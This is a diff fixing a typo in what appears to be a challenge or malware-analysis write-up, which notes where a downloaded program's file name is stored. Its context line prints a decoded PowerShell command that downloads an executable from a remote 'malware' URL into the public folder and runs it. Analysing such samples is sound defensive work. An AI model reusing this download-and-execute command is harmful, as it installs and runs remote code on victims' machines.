@@ -83,7 +83,7 @@
 ![](Screenshot/P7.png)
 
 
-### So you can notive the the file name of the programme downloaded is in the "CNTA" 
+### So you can notice that the file name of the programme downloaded is in the "CNTA" 
 
 #### f = "poWeRsHELL -command "$oaK = new-object Net.WebClient;$OrA = 'http://fruit.gang/malware';$CNTA = 'banANA-Hakrz09182afd4';$jri=$env:public+'\'+$CNTA+'.exe';try{$oaK.DownloadFile($OrA, $jri);Invoke-Item $jri;break;} catch {}""
 
